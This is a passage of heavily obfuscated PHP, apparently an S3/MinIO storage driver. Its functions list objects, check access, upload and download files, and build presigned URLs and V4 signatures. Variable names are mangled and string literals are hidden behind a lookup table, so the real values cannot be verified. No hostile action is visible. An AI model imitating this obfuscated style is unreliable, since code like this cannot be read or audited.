$ª“İ—¤ô[] = $—ˆ©ïµù; continue; } $ÇÇûŒæ[] = $‹ïß¯ı ? $ş£İÓÑ : $—ˆ©ïµù; } foreach ($£úŒğÙ[$ò¢õ÷í°[237]] as $ş£İÓÑ) { $ª“İ—¤ô[] = $ş£İÓÑ[$ò¢õ÷í°[32]]; $this->cacheMethodInfoSet($ş£İÓÑ[$ò¢õ÷í°[32]], !0); } $this->cacheMethodInfoSet($¾¼÷Á‡Ñ, !0); return array($ò¢õ÷í°[85] => $ª“İ—¤ô, $ò¢õ÷í°[86] => $ÇÇûŒæ); } private function listObjs($·‡ñ‡˜Ø, $ÚË”ìÓö = null, $ÎáÖ›Ùà = null, $ó§²ÏÙì = null) { $ø»Èè÷¯ =& $_SERVER[œ—üé‹ê]; $·‡ñ‡˜Ø = trim($·‡ñ‡˜Ø, $ø»Èè÷¯[8]); $‰„­Ğ¹ƒ = empty($·‡ñ‡˜Ø) && $·‡ñ‡˜Ø !== $ø»Èè÷¯[228] ? $ø»Èè÷¯[12] : $·‡ñ‡˜Ø . $ø»Èè÷¯[8]; return $this->client->getBucket($this->bucket, $‰„­Ğ¹ƒ, $ÚË”ìÓö, $ÎáÖ›Ùà, $ó§²ÏÙì, !0); } public function has($¼Ù®Ã“‡, $òí˜ß = false, $â¯É€ı = true) { $Èİßœ¥Ã =& $_SERVER[œ—üé‹ê]; $¼Ù®Ã“‡ = trim($¼Ù®Ã“‡, $Èİßœ¥Ã[8]); $°—ëĞô = empty($¼Ù®Ã“‡) && $¼Ù®Ã“‡ !== $Èİßœ¥Ã[228] ? $Èİßœ¥Ã[12] : $¼Ù®Ã“‡ . $Èİßœ¥Ã[8]; $ÄÇ‚øİ‚ = null; $»¥ø¹Î = 500; $¯§ÀúæŞ = $Èİßœ¥Ã[8]; $àëÄŞıé = $Æ÷®Å¦ = array(); while (!0) { $ÚáüÕü¦ = $this->listObjs($¼Ù®Ã“‡, $ÄÇ‚øİ‚, $»¥ø¹Î, $¯§ÀúæŞ); if (!$ÚáüÕü¦) { break; } $ÄÇ‚øİ‚ = $ÚáüÕü¦[$Èİßœ¥Ã[238]]; $Æ‰£­Û• = $ÚáüÕü¦[$Èİßœ¥Ã[236]]; $øó¡êéÔ = $ÚáüÕü¦[$Èİßœ¥Ã[237]]; if (empty($Æ‰£­Û•) && empty($øó¡êéÔ)) { break; } if (count($Æ‰£­Û•) == 1 && $Æ‰£­Û•[0][$Èİßœ¥Ã[32]] == $°—ëĞô) { break; } if ($òí˜ß) { if (count($Æ‰£­Û•)) { $Æ‰£­Û• = array_column($Æ‰£­Û•, $Èİßœ¥Ã[32]); $àëÄŞıé = array_merge($àëÄŞıé, $Æ‰£­Û•); } if (count($øó¡êéÔ)) { $øó¡êéÔ = array_column($øó¡êéÔ, $Èİßœ¥Ã[32]); $Æ÷®Å¦ = array_merge($Æ÷®Å¦, $øó¡êéÔ); } if ($ÄÇ‚øİ‚ === null) { break; } continue; } if ($â¯É€ı) { if (!empty($Æ‰£­Û•)) { if (count($Æ‰£­Û•) > 1 || isset($Æ‰£­Û•[0][$Èİßœ¥Ã[32]]) && $Æ‰£­Û•[0][$Èİßœ¥Ã[32]] != $°—ëĞô) { return !0; } } } else { if (!empty($øó¡êéÔ)) { return !0; } } if ($ÄÇ‚øİ‚ === null) { break; } } if ($òí˜ß) { $àëÄŞıé = array_diff($àëÄŞıé, array($°—ëĞô)); $àëÄŞıé = count(array_unique($àëÄŞıé)); $Æ÷®Å¦ = count(array_unique($Æ÷®Å¦)); return array($Èİßœ¥Ã[239] => $àëÄŞıé, $Èİßœ¥Ã[240] => $Æ÷®Å¦); } return !1; } public function listAll($Ö‘óİÉ§) { $õ×Ú…¹ =& $_SERVER[œ—üé‹ê]; $ô˜ƒõàÊ = $this->fileList($Ö‘óİÉ§, $õ×Ú…¹[12], !0); $èÓ¼ô½œ = array_to_keyvalue($ô˜ƒõàÊ[$õ×Ú…¹[86]], $õ×Ú…¹[32]); foreach ($ô˜ƒõàÊ[$õ×Ú…¹[85]] as $ğüëáö¯) { if (is_string($ğüëáö¯)) { $èÓ¼ô½œ[$ğüëáö¯] = array($õ×Ú…¹[79] => 0); } } return $this->listAllFiles($Ö‘óİÉ§, $èÓ¼ô½œ); } public function canRead($í£õ™ı˜) { $¨¬Ø‹½ù =& $_SERVER[œ—üé‹ê]; $Î›³œ‰÷ = $this->client->getAccessControlPolicy($this->bucket, $í£õ™ı˜); if (!$Î›³œ‰÷) { return !1; } return in_array($Î›³œ‰÷, array($¨¬Ø‹½ù[241], $¨¬Ø‹½ù[242], $¨¬Ø‹½ù[243])) ? !0 : !1; } public function canWrite($º­Ø“Ø¹) { $–ğ°î¿ =& $_SERVER[œ—üé‹ê]; $Åµş¹åÖ = $this->client->getAccessControlPolicy($this->bucket, $º­Ø“Ø¹); if (!$Åµş¹åÖ) { return !1; } return in_array($Åµş¹åÖ, array($–ğ°î¿[241], $–ğ°î¿[242])) ? !0 : !1; } public function getContent($ïÉŞ¤÷¨) { return $this->client->getObject($this->bucket, $ïÉŞ¤÷¨); } public function setContent($¹ê‰ûù¬, $ ª‡Ëòä = '', $«‚‘ë¸“ = false) { $ùµãüÚ‚ =& $_SERVER[œ—üé‹ê]; $¹ê‰ûù¬ = $«‚‘ë¸“ ? trim($¹ê‰ûù¬, $ùµãüÚ‚[8]) . $ùµãüÚ‚[8] : $¹ê‰ûù¬; $ùëç¼ÒÚ = get_file_mime(get_path_ext($¹ê‰ûù¬)); $ÏÛ½¾ó© = $this->client->putObject($ ª‡Ëòä, $this->bucket, $¹ê‰ûù¬, $ùµãüÚ‚[229], array(), $ùëç¼ÒÚ); if (!$ÏÛ½¾ó©) { return !1; } if ($«‚‘ë¸“) { return !0; } return $ÏÛ½¾ó© ? !0 : !1; } public function fileSubstr($§Ù‚“–í, $á®õúà¥, $äƒî´üã) { $¯Íİ±á€ = $á®õúà¥ + $äƒî´üã - 1; return $this->client->getObject($this->bucket, $§Ù‚“–í, array($_SERVER[œ—üé‹ê][244] => "\x62\171\x74\145\x73\75{$á®õúà¥}\x2d{$¯Íİ±á€}")); } public function upload($·¿÷£ùß, $çáõÙ’‘, $’Å†÷¹Ú = false, $’”“ª¤› = REPEAT_REPLACE) { $¯‘—²¯Œ =& $_SERVER[œ—üé‹ê]; if (!$çáõÙ’‘ || !@file_exists($çáõÙ’‘)) { return !1; } $¢Ã½šÂ = array($¯‘—²¯Œ[245] => @md5_file($çáõÙ’‘)); $²Ş‘ˆÑ· = array($¯‘—²¯Œ[246] => get_file_mime(get_path_ext($·¿÷£ùß))); if (IO::size($çáõÙ’‘) <= 1024 * 1024 * 200) { $§Ûú‚ä = $this->client->putObjectFile($çáõÙ’‘, $this->bucket, $·¿÷£ùß, $¯‘—²¯Œ[229], $¢Ã½šÂ, $²Ş‘ˆÑ·); return !empty($§Ûú‚ä) ? $this->getPathOuter($·¿÷£ùß) : !1; } $šÎè–øÃ = $this->client->multiUploadObject($çáõÙ’‘, $this->bucket, trim($·¿÷£ùß, $¯‘—²¯Œ[8]), $¢Ã½šÂ, $²Ş‘ˆÑ·); return $šÎè–øÃ ? $this->getPathOuter($·¿÷£ùß) : !1; } public function download($‘ıÂÁÒÊ, $òºøƒ¾½) { if (!@is_dir($this->pathFather($òºøƒ¾½)) && !IO::mkdir($this->pathFather($òºøƒ¾½))) { return !1; } $ç§ÒõÅ = $this->client->getObject($this->bucket, $‘ıÂÁÒÊ, array(), $òºøƒ¾½); return $ç§ÒõÅ !== !1 ? $òºøƒ¾½ : !1; } public function link($²œÇŠ, $Ñ‘ ËÜª = array()) { return $this->getPreSignedURL($²œÇŠ, 3600 * 12, $Ñ‘ ËÜª); } private function getPreSignedURL($²¹¥Ğ, $Ñ¤î–ç, $á†…ı«” = array(), $€Ôç¥¡ = "\x47\105\x54") { $®Êé­àš =& $_SERVER[œ—üé‹ê]; $²¹¥Ğ = trim($²¹¥Ğ, $®Êé­àš[8]); if ($this->signVer == $®Êé­àš[247]) { return $this->client->getPreSignedV2URL($this->bucket, $²¹¥Ğ, $Ñ¤î–ç, $€Ôç¥¡, $á†…ı«”); } return $this->client->getPreSignedV4URL($this->bucket, $²¹¥Ğ, $Ñ¤î–ç, array(), $€Ôç¥¡, $á†…ı«”); } public function fileOut($Ù¨ß„˜Ù, $ÙùÈ¶Ç® = false, $ïãûëãÁ = false, $†¦õÎ¬ú = '') { $ ú€®ã =& $_SERVER[œ—üé‹ê]; if ($this->isFileOutServer()) { return $this->fileOutServer($Ù¨ß„˜Ù, $ÙùÈ¶Ç®, $ïãûëãÁ, $†¦õÎ¬ú); } if (!$ïãûëãÁ) { $ïãûëãÁ = $this->pathThis($Ù¨ß„˜Ù); } $éâ´ˆ… = get_file_mime(get_path_ext($ïãûëãÁ)); if ($éâ´ˆ… == $ ú€®ã[248]) { return parent::fileOut($Ù¨ß„˜Ù, $ÙùÈ¶Ç®, $ïãûëãÁ, $†¦õÎ¬ú); } $¸àâ©¶· = array($ ú€®ã[249] => $éâ´ˆ…); if ($ÙùÈ¶Ç®) { $¸àâ©¶·[$ ú€®ã[250]] = $ ú€®ã[251] . rawurlencode($ïãûëãÁ); } else { } $×€·«şÊ = $this->link($Ù¨ß„˜Ù, $¸àâ©¶·); $this->fileOutLink($×€·«şÊ); } public function fileOutServer($Š‘¿â³¸, $³àÏš”ó = false, $ß±Ë²ˆ = false, $õµÌÍ¶¬ = '') { parent::fileOut($Š‘¿â³¸, $³àÏš”ó, $ß±Ë²ˆ, $õµÌÍ¶¬); } public function fileOutImageServer($ÜµğÊ£ğ, $İÅ‚û³÷ = 250) { parent::fileOutImage($ÜµğÊ£ğ, $İÅ‚û³÷); } public function fileOutLink($è®¾£¬) { $óÆ¤ÖŞ… =& $_SERVER[œ—üé‹ê]; if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($óÆ¤ÖŞ…[67], $óÆ¤ÖŞ…[66], $óÆ¤ÖŞ…[68])) && !get_url_scheme($this->endpoint) && substr($è®¾£¬, 0, 7) == $óÆ¤ÖŞ…[216]) { $è®¾£¬ = $óÆ¤ÖŞ…[217] . substr($è®¾£¬, 7); } header($óÆ¤ÖŞ…[172] . $è®¾£¬); die; } public function hashMd5($ÅÔ¦È½ê, $Îş÷­‚ˆ = '') { $ˆé¾ùîã = $this->objectMeta($ÅÔ¦È½ê); if (!$ˆé¾ùîã) { return !1; } $Îş÷­‚ˆ = $Îş÷­‚ˆ ? $Îş÷­‚ˆ : _get($ˆé¾ùîã, $_SERVER[œ—üé‹ê][252]); return $Îş÷­‚ˆ; } public function uploadFormData($•ö™ıµŞ, $…êÛğôÂ = 3600) { $ÑäÑı²ö =& $_SERVER[œ—üé‹ê]; if (!$this->_isClientAsync()) { $çãñèÒÄ = $this->getPreSignedURL($•ö™ıµŞ, $…êÛğôÂ, array(), $ÑäÑı²ö[253]); return array($ÑäÑı²ö[206] => str_replace($ÑäÑı²ö[216], $ÑäÑı²ö[254], $çãñèÒÄ)); } if (isset($GLOBALS[$ÑäÑı²ö[6]][$ÑäÑı²ö[92]][$ÑäÑı²ö[255]]) && $GLOBALS[$ÑäÑı²ö[6]][$ÑäÑı²ö[92]][$ÑäÑı²ö[255]] == $ÑäÑı²ö[228]) { return $this->uploadMultiData($•ö™ıµŞ, $…êÛğôÂ); } if ($this->signVer == $ÑäÑı²ö[247]) { return $this->uploadFormDataV2($•ö™ıµŞ, $…êÛğôÂ); } return $this->uploadFormDataV4($•ö™ıµŞ, $…êÛğôÂ); } public function uploadFormDataV2($ÔòŞè¡Æ, $š²÷ ¸Š = 3600) { $¥É¾¯Š =& $_SERVER[œ—üé‹ê]; $¬•Õûèª = $this->pathFather($ÔòŞè¡Æ); $Šº®ˆ· = $this->client->getHttpUploadPostParams($this->bucket, $¬•Õûèª, $¥É¾¯Š[229], $š²÷ ¸Š); $ßÊ—ãåê = array_merge((array) $Šº®ˆ·, array($¥É¾¯Š[256] => $¥É¾¯Š[247], $¥É¾¯Š[206] => $this->getHost())); if ($this->_isClientAsync()) { unset($ßÊ—ãåê[$¥É¾¯Š[256]]); } return $ßÊ—ãåê; } public function uploadFormDataV4($äå‹Ø¶, $Ìï×Û±¦ = 3600) { $­³˜©İƒ =& $_SERVER[œ—üé‹ê]; $Ä³µÖÊ­ = $­³˜©İƒ[229]; $åòß»À = $­³˜©İƒ[257]; $„²Æ£Œ¼ = $­³˜©İƒ[62]; $¸Ûñ = gmdate($­³˜©İƒ[258]); $Ô°½¿ü£ = gmdate($­³˜©İƒ[259]); $´èÌè = $­³˜©İƒ[260]; $Àğ©†èÕ = $Ìï×Û±¦ . $­³˜©İƒ[12]; $·Ûà‘„Š = $­³˜©İƒ[261]; $ıøêãéå = array($this->accessKey, $Ô°½¿ü£, $this->region, $„²Æ£Œ¼, $´èÌè); $ö‚€Õóò = implode($­³˜©İƒ[8], $ıøêãéå); $ø¸€–œ = array($­³˜©İƒ[262] => gmdate($­³˜©İƒ[263], strtotime($­³˜©İƒ[264])), $­³˜©İƒ[265] => array(array($­³˜©İƒ[266] => $this->bucket), array($­³˜©İƒ[267], $­³˜©İƒ[268], $­³˜©İƒ[12]), array($­³˜©İƒ[267], $­³˜©İƒ[269], $­³˜©İƒ[12]), array($­³˜©İƒ[270] => $·Ûà‘„Š), array($­³˜©İƒ[271] => $ö‚€Õóò), array($­³˜©İƒ[272] => $åòß»À), array($­³˜©İƒ[273] => $¸Ûñ), array($­³˜©İƒ[274] => $Àğ©†èÕ))); $©óÅƒÅ = base64_encode(json_encode($ø¸€–œ)); $é‘ØÁí¡ = hash_hmac($­³˜©İƒ[275], $Ô°½¿ü£, $­³˜©İƒ[276] . $this->secret, !0); $àİéÌßÙ = hash_hmac($­³˜©İƒ[275], $this->region, $é‘ØÁí¡, !0); $ášƒĞ³ë = hash_hmac($­³˜©İƒ[275], $„²Æ£Œ¼, $àİéÌßÙ, !0); $íØ©ú…¶ = hash_hmac($­³˜©İƒ[275], $´èÌè, $ášƒĞ³ë, !0); $ÅÜ—ÒÖ = hash_hmac($­³˜©İƒ[275], $©óÅƒÅ, $íØ©ú…¶); $ÙºÔÂàë = array($­³˜©İƒ[246] => $­³˜©İƒ[12], $­³˜©İƒ[270] => $·Ûà‘„Š, $­³˜©İƒ[277] => $©óÅƒÅ, $­³˜©İƒ[271] => $ö‚€Õóò, $­³˜©İƒ[272] => $åòß»À, $­³˜©İƒ[273] => $¸Ûñ, $­³˜©İƒ[274] => $Àğ©†èÕ, $­³˜©İƒ[278] => $ÅÜ—ÒÖ, $­³˜©İƒ[256] => $­³˜©İƒ[247], $­³˜©İƒ[206] => $this->getHost()); if ($this->_isClientAsync()) { unset($ÙºÔÂàë[$­³˜©İƒ[256]]); } return $ÙºÔÂàë; } public function uploadMultiData($¦¶Á¹–õ, $·Âûòã = 3600) { $¸¥½ß¶ò =& $_SERVER[œ—üé‹ê]; $ûúµ¾ã§ = $this->signVer == $¸¥½ß¶ò[247] ? gmdate($¸¥½ß¶ò[279]) : gmdate($¸¥½ß¶ò[280]); $Â€åÊûØ = array(); $ß¾îÉ¶ = $this->client->getUploadId($this->bucket, $¦¶Á¹–õ, $Â€åÊûØ); if (!$ß¾îÉ¶) { return !1; } $¿Â”‹æ = array($¸¥½ß¶ò[281] => $ß¾îÉ¶, $¸¥½ß¶ò[206] => $this->getHost() . $¸¥½ß¶ò[8] . $this->pathEncode($¦¶Á¹–õ), $¸¥½ß¶ò[282] => $ûúµ¾ã§, $¸¥½ß¶ò[95] => $¦¶Á¹–õ, $¸¥½ß¶ò[256] => $this->signVer); if ($this->_isClientAsync()) { unset($¿Â”‹æ[$¸¥½ß¶ò[256]]); } return $¿Â”‹æ; } public function uploadMultiAuth($şÑ½ªº, $Èî†Ì³û = array()) { $•šï˜¯á =& $_SERVER[œ—üé‹ê]; if ($this->signVer == $•šï˜¯á[247]) { if (isset($Èî†Ì³û[$•šï˜¯á[283]])) { return $this->uploadPartAuthV2($şÑ½ªº, $Èî†Ì³û); } return $this->uploadListAuthV2($şÑ½ªº, $Èî†Ì³û); } if (isset($Èî†Ì³û[$•šï˜¯á[283]])) { return $this->uploadPartAuthV4($şÑ½ªº, $Èî†Ì³û); } return $this->uploadListAuthV4($şÑ½ªº, $Èî†Ì³û); } public function uploadPartAuthV2($ÚÆÀ‰Åù, $ÜÅÜïåÇ = array()) { $ˆ²È²©ˆ =& $_SERVER[œ—üé‹ê]; $œ›ÜÎ‰Û = $ÜÅÜïåÇ[$ˆ²È²©ˆ[95]]; $ßÈû„áÑ = gmdate($ˆ²È²©ˆ[279]); $°İ°€‡Ë = array_intersect_key($ÜÅÜïåÇ, array_flip(array($ˆ²È²©ˆ[283], $ˆ²È²©ˆ[281]))); ksort($°İ°€‡Ë); $ë¦íÉµ = $°İ°€‡Ë ? $ˆ²È²©ˆ[76] . http_build_query($°İ°€‡Ë, null, $ˆ²È²©ˆ[284], PHP_QUERY_RFC3986) : $ˆ²È²©ˆ[12]; $‰‘Ã×àŸ = array($ˆ²È²©ˆ[253], $ˆ²È²©ˆ[12], $ˆ²È²©ˆ[120], $ˆ²È²©ˆ[12], "\x78\55\x61\x6d\x7a\x2d\x64\x61\x74\x65\72{$ßÈû„áÑ}", $ˆ²È²©ˆ[8] . $this->bucket . $ˆ²È²©ˆ[8] . $this->pathEncode($œ›ÜÎ‰Û) . $ë¦íÉµ); $Î€âÓ­ = implode($ˆ²È²©ˆ[285], $‰‘Ã×àŸ); $¥“Êô„ú = $this->client->__getSignature($Î€âÓ­); return array($ˆ²È²©ˆ[286] => $¥“Êô„ú, $ˆ²È²©ˆ[282] => $ßÈû„áÑ); } public function uploadListAuthV2($“ ¨¡—¤, $öòàš½¢ = array()) { $™ÊÜèÕ =& $_SERVER[œ—üé‹ê]; $•ÔòßˆŞ = $öòàš½¢[$™ÊÜèÕ[95]]; $øı²¶ç¹ = $öòàš½¢[$™ÊÜèÕ[281]]; $«ô’ı‹× = $this->client->listParts($this->bucket, $•ÔòßˆŞ, $øı²¶ç¹); if (!$«ô’ı‹×) { return !1; } $òº¢£× = gmdate($™ÊÜèÕ[279]); $”È³¤Üğ = $™ÊÜèÕ[287] . $øı²¶ç¹; $ùÂ‹ˆì’ = array($™ÊÜèÕ[288], $™ÊÜèÕ[12], $™ÊÜèÕ[120], $™ÊÜèÕ[12], "\x78\55\141\x6d\x7a\55\144\141\x74\x65\72{$òº¢£×}", $™ÊÜèÕ[8] . $this->bucket . $™ÊÜèÕ[8] . $this->pathEncode($•ÔòßˆŞ) . $”È³¤Üğ); $¼Èó¨ÄÙ = implode($™ÊÜèÕ[285], $ùÂ‹ˆì’); $òˆ¨ƒ³ü = $this->client->__getSignature($¼Èó¨ÄÙ); return array($™ÊÜèÕ[286] => $òˆ¨ƒ³ü, $™ÊÜèÕ[282] => $òº¢£×, $™ÊÜèÕ[289] => $«ô’ı‹×); } public function uploadPartAuthV4($ß›Ùá·‰, $é—¶áë½ = array()) { $çÛÁ±²ø =& $_SERVER[œ—üé‹ê]; $Ó–ÆèÌ´ = $é—¶áë½[$çÛÁ±²ø[95]]; $ó‡¡àÃè = array($çÛÁ±²ø[273] => gmdate($çÛÁ±²ø[280]), $çÛÁ±²ø[290] => _get($é—¶áë½, $çÛÁ±²ø[291], hash($çÛÁ±²ø[275], $çÛÁ±²ø[12]))); $ Æ¬íö› = explode($çÛÁ±²ø[208], $this->getHost()); $¿³ªòêå = array($çÛÁ±²ø[292] => $ Æ¬íö›[1], $çÛÁ±²ø[293] => $çÛÁ±²ø[12], $çÛÁ±²ø[246] => $çÛÁ±²ø[120], $çÛÁ±²ø[294] => $é—¶áë½[$çÛÁ±²ø[79]]); $û‹Ü½ÃÉ = $çÛÁ±²ø[253]; $Õâ’µîß = $çÛÁ±²ø[8] . $this->pathEncode($Ó–ÆèÌ´); $³ªÛŸ„ = array_intersect_key($é—¶áë½, array_flip(array($çÛÁ±²ø[283], $çÛÁ±²ø[281]))); $é…ûáâ÷ = $this->client->__getSignatureV4($ó‡¡àÃè, $¿³ªòêå, $û‹Ü½ÃÉ, $Õâ’µîß, $³ªÛŸ„); return array($çÛÁ±²ø[286] => $é…ûáâ÷, $çÛÁ±²ø[290] => $ó‡¡àÃè[$çÛÁ±²ø[290]], $çÛÁ±²ø[282] => $ó‡¡àÃè[$çÛÁ±²ø[273]]); } public function uploadListAuthV4($æ³”˜Êñ, $·œèœƒ« = array()) { $¯ıƒ®Äà =& $_SERVER[œ—üé‹ê]; $´”ø—« = $·œèœƒ«[$¯ıƒ®Äà[95]]; $ÆÜ‹Ú¨§ = $·œèœƒ«[$¯ıƒ®Äà[281]]; $É§é†²é = $this->client->listParts($this->bucket, $´”ø—«, $ÆÜ‹Ú¨§); if (!$É§é†²é) { return !1; } $ôÛãÎ´Æ = $¯ıƒ®Äà[295]; foreach ($É§é†²é as $ŞæÒ¹‰) { $ôÛãÎ´Æ .= $¯ıƒ®Äà[296] . "\74\120\141\162\x74\116\165\155\142\145\162\76{$ŞæÒ¹‰[$¯ıƒ®Äà[297]]}\x3c\x2f\x50\141\x72\x74\x4e\165\155\142\x65\162\x3e\xa" . "\74\105\x54\x61\x67\76{$ŞæÒ¹‰[$¯ıƒ®Äà[298]]}\74\57\x45\124\141\x67\x3e\xa" . $¯ıƒ®Äà[299]; } $ôÛãÎ´Æ .= $¯ıƒ®Äà[300]; $ÜÑ£Ü·± = array($¯ıƒ®Äà[273] => gmdate($¯ıƒ®Äà[280]), $¯ıƒ®Äà[290] => hash($¯ıƒ®Äà[275], $ôÛãÎ´Æ)); $öÒ•÷„ = explode($¯ıƒ®Äà[208], $this->getHost()); $”ôšäËã = array($¯ıƒ®Äà[292] => $öÒ•÷„[1], $¯ıƒ®Äà[246] => $¯ıƒ®Äà[120], $¯ıƒ®Äà[294] => strlen($ôÛãÎ´Æ)); $ä¸ÄÃıÁ = $¯ıƒ®Äà[288]; $×”ôèı = $¯ıƒ®Äà[8] . $this->pathEncode($´”ø—«); $›é¼ïÃÃ = array($¯ıƒ®Äà[281] => $ÆÜ‹Ú¨§); $»Èö³Û¥ = $this->client->__getSignatureV4($ÜÑ£Ü·±, $”ôšäËã, $ä¸ÄÃıÁ, $×”ôèı, $›é¼ïÃÃ); return array($¯ıƒ®Äà[286] => $»Èö³Û¥, $¯ıƒ®Äà[290] => $ÜÑ£Ü·±[$¯ıƒ®Äà[290]], $¯ıƒ®Äà[282] => $ÜÑ£Ü·±[$¯ıƒ®Äà[273]], $¯ıƒ®Äà[289] => $É§é†²é); } private function _isClientAsync() { $•å“íóÓ =& $_SERVER[œ—üé‹ê]; static $ÍÉèÇÈ• = null; if ($ÍÉèÇÈ• === null) { $ö´Ú»› = isset($_REQUEST[$•å“íóÓ[301]]) ? json_decode($_REQUEST[$•å“íóÓ[301]], !0) : !1; $ÍÉèÇÈ• = $ö´Ú»› && _get($ö´Ú»›, $•å“íóÓ[302]) == $•å“íóÓ[303]; } return $ÍÉèÇÈ•; } public function getHost() { $¸Êä’Ñ¥ =& $_SERVER[œ—üé‹ê]; $¶öĞ­À« = parent::getHost(); if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($¸Êä’Ñ¥[70], $¸Êä’Ñ¥[64], $¸Êä’Ñ¥[69], $¸Êä’Ñ¥[62]))) { return $¶öĞ­À« . $¸Êä’Ñ¥[8] . $this->bucket; } if ($this->osType == $¸Êä’Ñ¥[62] && !is_domain($¶öĞ­À«)) { return $¶öĞ­À« . $¸Êä’Ñ¥[8] . $this->bucket; } $¶öĞ­À« = explode($¸Êä’Ñ¥[208], $¶öĞ­À«); return $¶öĞ­À«[0] . $¸Êä’Ñ¥[208] . $this->bucket . $¸Êä’Ñ¥[10] . $¶öĞ­À«[1]; } public function size($îÃ„Èî) { $ÂöÚÇê = $this->objectMeta($îÃ„Èî); return $ÂöÚÇê ? $ÂöÚÇê[$_SERVER[œ—üé‹ê][79]] : 0; } public function info($ã§“Õ¢) { if ($this->isFolder($ã§“Õ¢)) { return $this->folderInfo($ã§“Õ¢); } else { if ($this->isFile($ã§“Õ¢)) { return $this->fileInfo($ã§“Õ¢); } } return !1; } public function exist($Åí¬Ç¡) { return $this->isFile($Åí¬Ç¡) || $this->isFolder($Åí¬Ç¡); } public function isFile($¬ûƒàÙ) { return !$this->isFolder($¬ûƒàÙ) && $this->objectMeta($¬ûƒàÙ); } public function isFolder($è†ç¾¯) { return $this->cacheMethod($_SERVER[œ—üé‹ê][177], $è†ç¾¯); } protected function objectMeta($×€Çëî) { return $this->cacheMethod($_SERVER[œ—üé‹ê][179], $×€Çëî); } protected function _objectMeta($÷Ÿæ”íş) { $ÒÉ¡¼‹— =& $_SERVER[œ—üé‹ê]; $÷Ÿæ”íş = rtrim($÷Ÿæ”íş, $ÒÉ¡¼‹—[8]); try { $İŒÊê Î = $this->client->getObjectInfo($this->bucket, $÷Ÿæ”íş); if (!isset($İŒÊê Î[$ÒÉ¡¼‹—[252]]) && isset($İŒÊê Î[$ÒÉ¡¼‹—[304]])) { $İŒÊê Î[$ÒÉ¡¼‹—[252]] = $İŒÊê Î[$ÒÉ¡¼‹—[304]]; } } catch (Exception $éæßÇÀ­) { $İŒÊê Î = !1; } if (!$İŒÊê Î) { } return $İŒÊê Î; } protected function _isFolder($šåäœ ) { $äá›é©è =& $_SERVER[œ—üé‹ê]; $šåäœ  = rtrim($šåäœ , $äá›é©è[8]) . $äá›é©è[8]; if ($šåäœ  == $äá›é©è[12] || $šåäœ  == $äá›é©è[8]) { return !0; } $ı¥¿Øèû = $this->client->getBucket($this->bucket, $šåäœ , null, 1); if (empty($ı¥¿Øèû[$äá›é©è[236]])) { return !1; } $öŞ¨îˆ© = $ı¥¿Øèû[$äá›é©è[236]][0][$äá›é©è[32]]; return stripos($öŞ¨îˆ©, $šåäœ ) === 0 ? !0 : !1; if (substr($öŞ¨îˆ©, -1) == $äá›é©è[8]) { return !0; } if (get_path_this($öŞ¨îˆ©) == get_path_this($šåäœ )) { return !1; } return !0; } public function listObject($€§ãÇ¦²) { return $this->fileList($€§ãÇ¦², $_SERVER[œ—üé‹ê][12], !0); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($ğÀ¦¦¯) { $öüşáç¬ =& $_SERVER[œ—üé‹ê]; parent::__construct($ğÀ¦¦¯); $this->setSignVersion($öüşáç¬[247]); if (!$this->region) { $this->region = $öüşáç¬[305]; $this->setRegion($this->region); } $this->client->setHeadValid(!1); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function uploadFormData($ŸñÄõÛ, $Ê¤Ü§Íç = 3600) { $øÕĞ½ğŸ =& $_SERVER[œ—üé‹ê]; $¶˜èÀš„ = $øÕĞ½ğŸ[229]; $¿×—ŞÑÜ = $øÕĞ½ğŸ[257]; $±åğÆãš = $øÕĞ½ğŸ[62]; $ÜµãªÍÂ = gmdate($øÕĞ½ğŸ[258]); $öÓ÷¾ = gmdate($øÕĞ½ğŸ[259]); $¯¼Š¶  = $øÕĞ½ğŸ[260]; $´òœÀï = $Ê¤Ü§Íç . $øÕĞ½ğŸ[12]; $¶íÅğÖ¯ = $øÕĞ½ğŸ[261]; $éÂ•ê¼¹ = array($this->accessKey, $öÓ÷¾, $this->region, $±åğÆãš, $¯¼Š¶ ); $˜É‚‚ü = implode($øÕĞ½ğŸ[8], $éÂ•ê¼¹); $öÛÆÒÓ = array($øÕĞ½ğŸ[262] => gmdate($øÕĞ½ğŸ[263], strtotime($øÕĞ½ğŸ[264])), $øÕĞ½ğŸ[265] => array(array($øÕĞ½ğŸ[266] => $this->bucket), array($øÕĞ½ğŸ[306] => $¶˜èÀš„), array($øÕĞ½ğŸ[267], $øÕĞ½ğŸ[268], $øÕĞ½ğŸ[12]), array($øÕĞ½ğŸ[267], $øÕĞ½ğŸ[269], $øÕĞ½ğŸ[12]), array($øÕĞ½ğŸ[267], $øÕĞ½ğŸ[307], $øÕĞ½ğŸ[12]), array($øÕĞ½ğŸ[270] => $¶íÅğÖ¯), array($øÕĞ½ğŸ[271] => $˜É‚‚ü), array($øÕĞ½ğŸ[272] => $¿×—ŞÑÜ), array($øÕĞ½ğŸ[273] => $ÜµãªÍÂ), array($øÕĞ½ğŸ[274] => $´òœÀï))); $Ï¾£†¡¸ = base64_encode(json_encode($öÛÆÒÓ)); $¼´ÏäÖÚ = hash_hmac($øÕĞ½ğŸ[275], $öÓ÷¾, $øÕĞ½ğŸ[276] . $this->secret, !0); $³­âë¤Ì = hash_hmac($øÕĞ½ğŸ[275], $this->region, $¼´ÏäÖÚ, !0); $»ã²¢¸÷ = hash_hmac($øÕĞ½ğŸ[275], $±åğÆãš, $³­âë¤Ì, !0); $…æâ„˜İ = hash_hmac($øÕĞ½ğŸ[275], $¯¼Š¶ , $»ã²¢¸÷, !0); $¹å¥¹Æ¤ = hash_hmac($øÕĞ½ğŸ[275], $Ï¾£†¡¸, $…æâ„˜İ); $Ùˆ—ëÙÊ = array($øÕĞ½ğŸ[246] => $øÕĞ½ğŸ[12], $øÕĞ½ğŸ[294] => $øÕĞ½ğŸ[12], $øÕĞ½ğŸ[306] => $¶˜èÀš„, $øÕĞ½ğŸ[270] => $¶íÅğÖ¯, $øÕĞ½ğŸ[277] => $Ï¾£†¡¸, $øÕĞ½ğŸ[308] => $˜É‚‚ü, $øÕĞ½ğŸ[309] => $¿×—ŞÑÜ, $øÕĞ½ğŸ[310] => $ÜµãªÍÂ, $øÕĞ½ğŸ[311] => $´òœÀï, $øÕĞ½ğŸ[312] => $¹å¥¹Æ¤, $øÕĞ½ğŸ[206] => $this->getHost()); return $Ùˆ—ëÙÊ; } } goto 